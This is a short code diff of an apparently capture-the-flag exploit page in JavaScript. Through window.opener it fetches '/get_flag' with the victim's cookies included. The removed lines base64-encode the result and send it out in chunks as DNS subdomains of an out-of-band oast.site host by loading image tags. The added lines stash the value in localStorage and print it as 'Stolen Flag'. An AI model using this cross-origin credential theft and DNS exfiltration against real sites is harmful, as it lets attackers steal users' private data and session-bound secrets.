@@ -7,16 +7,15 @@ if (window.opener) {
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        let encoded = btoa(flag).replace(/=/g, ''); // remove padding
-        let chunks = encoded.match(/.{1,32}/g);
-        for (let i = 0; i < chunks.length; i++) {
-          let subdomain = chunks[i] + '.' + i + '.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site';
-          let img = document.createElement('img');
-          img.src = 'http://' + subdomain + '/';
-          document.body.appendChild(img);
-        }
+        localStorage.setItem('stolen_flag', flag);
       });
   `);
+
+  // Wait a bit and then pull the flag from localStorage
+  setTimeout(() => {
+    document.write('<h1>Stolen Flag:</h1>');
+    document.write('<pre>' + localStorage.getItem('stolen_flag') + '</pre>');
+  }, 1000);
 }
 </script>
 </body>
